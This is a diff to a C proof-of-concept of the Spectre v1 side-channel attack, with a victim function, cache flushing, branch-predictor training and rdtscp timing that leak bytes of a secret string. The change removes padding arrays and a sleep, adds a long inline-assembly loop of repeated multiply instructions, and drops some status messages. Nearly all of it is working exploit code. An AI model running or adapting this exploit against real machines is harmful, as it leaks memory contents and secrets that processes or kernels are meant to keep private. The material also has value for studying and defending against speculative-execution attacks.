@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include <unistd.h>
+#include<unistd.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -12,14 +12,12 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
+
+
 unsigned int array1_size = 16;
-uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
-uint8_t unused2[64];
-uint8_t array2[256 * 512];
-
+uint8_t array2[256 * 512]; // = 131072 = 4096 * 32
 char * secret = "This code uses the Spectre vulnerability to access kernel memory";
-
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 void victim_function(size_t x) {
@@ -40,18 +38,98 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-  usleep(10000);
+
+  for(int x86=0; x86 < 5000000; x86++) {
+      __asm__("mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "mov $0x0000000003FCE23A,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8\n\t"
+        "imul $0xD,%r8,%r8");
+    }
+
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
-
     /* Flush array2[256*(0..255)] from cache */
-    for (i = 0; i < 256; i++)
+    for (i = 0; i < 256; i++) {
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
-
+    }
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    training_x = tries % array1_size;
+    training_x = tries % array1_size; // allowed x within array1
     for (j = 29; j >= 0; j--) {
+      
       _mm_clflush( & array1_size);
       for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
@@ -68,6 +146,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
+     
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
       time1 = __rdtscp( & junk); /* READ TIMER */
@@ -111,9 +190,7 @@ int main(int argc,
     sscanf(argv[2], "%d", & len);
   }
 
-  printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     readMemoryByte(malicious_x++, value, score);
    // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X='%c' score=%d ", value[0],
